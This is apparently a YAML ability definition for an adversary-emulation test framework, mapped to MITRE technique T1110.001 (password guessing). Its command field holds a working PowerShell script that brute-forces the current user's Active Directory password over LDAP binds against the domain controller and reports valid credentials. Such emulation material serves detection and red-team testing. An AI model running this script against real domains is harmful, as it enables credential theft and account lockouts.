- requirements: []
  name: Soumaia ART Tests - Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)
  description: Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos
  tactic: credential-access
  technique_id: T1110.001
  technique_name: 'Brute Force: Password Guessing'
  executors:
  - cleanup: []
    timeout: 60
    platform: windows
    name: psh
    payloads:
    - passwords.txt
    parsers: []
    command: if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) { Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"; exit 1 }; [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389); $passwordList = Get-Content -Path ".\passwords.txt"; foreach ($password in $passwordList){ $credz = new-object System.Net.NetworkCredential("$ENV:USERNAME", $password, "$env:UserDnsDomain"); $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM); try { Write-Host " [-] Attempting ${password} on account $ENV:USERNAME."; $conn.bind(); Write-Host " [!] $ENV:USERNAME:${password} are valid credentials!" } catch { Write-Host $_.Exception.Message } }; Write-Host "End of bruteforce"
  id: a8e3c099-451d-5891-8855-c7fb473b74a9
